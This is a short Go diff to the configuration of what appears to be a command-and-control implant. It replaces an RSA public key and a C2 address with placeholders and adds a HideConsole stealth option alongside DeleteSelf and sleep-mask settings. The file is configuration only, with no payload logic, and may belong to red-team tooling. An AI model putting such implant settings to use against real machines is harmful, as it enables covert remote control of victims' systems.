@@ -7,15 +7,13 @@ import (
 
 var (
 	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
-	MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDgORNYO7a3SULgnCWc8tsfDLRj/bzxYvedlAz
-cH5eYQ0vn9b+PVMJP9I45PIjqwRMH847f7fspUVa7lU8fada0s6jCkpa5431jZ2WGjeuSUnrIylY
-iN8aNspGffPVfyvZBNBZ5rai+nZvFKAkWpG3sBNL/ekVhICh2AHHkrBKDQIDAQAB
+	Here should be your publickey
 -----END PUBLIC KEY-----`)
 	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
 	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA	
 -----END PRIVATE KEY-----`)
 
-	C2        = "192.168.140.131:1234"
+	C2        = "ip:port"
 	plainHTTP = "http://"
 	sslHTTP   = "https://"
 	GetUrl    = sslHTTP + C2 + Http_get_uri
@@ -35,6 +33,7 @@ iN8aNspGffPVfyvZBNBZ5rai+nZvFKAkWpG3sBNL/ekVhICh2AHHkrBKDQIDAQAB
 
 	//Sleep_mask = true
 	DeleteSelf         = false
+	HideConsole        = true
 	ComputerNameLength = 0
 )
 
